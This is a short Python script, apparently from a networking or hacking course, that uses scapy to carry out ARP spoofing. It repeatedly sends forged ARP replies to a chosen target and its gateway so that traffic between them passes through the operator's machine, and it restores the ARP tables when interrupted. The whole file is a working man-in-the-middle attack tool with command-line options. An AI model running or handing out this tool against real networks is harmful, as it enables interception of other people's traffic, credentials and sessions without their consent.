# usage: arp_spoof.py [-h] [-t TARGET] [-g GATEWAY]
# 
# optional arguments:
#  -h, --help            show this help message and exit
#   -t TARGET, --target TARGET
#                         Target IP address
#   -g GATEWAY, --gateway GATEWAY
#                         Router/Gateway IP address
#


import scapy.all as scapy
import time
import sys
import argparse

def get_target_and_gateway():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target" , dest="target", default="192.168.0.106", help="Target IP address")
    parser.add_argument("-g","--gateway",dest="gateway",default="192.168.0.1",help="Router/Gateway IP address")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    if not answer:
        return None
    return answer[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        return False
    packet = scapy.ARP(op=2 , pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet,verbose=False)
    return True

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac is None or src_mac is None:
        return False
    packet = scapy.ARP(op=2, pdst = dest_ip , hwdst = dest_mac, psrc = src_ip , hwsrc = src_mac)
    scapy.send(packet,count=4,verbose=False)
    return True

options = get_target_and_gateway()
target_ip = options.target
gateway_ip = options.gateway

packet_count = 0
try:
    while True:
        if not spoof(target_ip , gateway_ip):
            continue
        if not spoof(gateway_ip , target_ip):
            continue
        packet_count += 2
        print("\r[+] Packet sent : " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Stopped Spoofing...")
    print("[+] Reseting...")
    while not restore(target_ip, gateway_ip):
        continue
    while not restore(gateway_ip , target_ip):
        continue
    print("[+] Everything restored...")
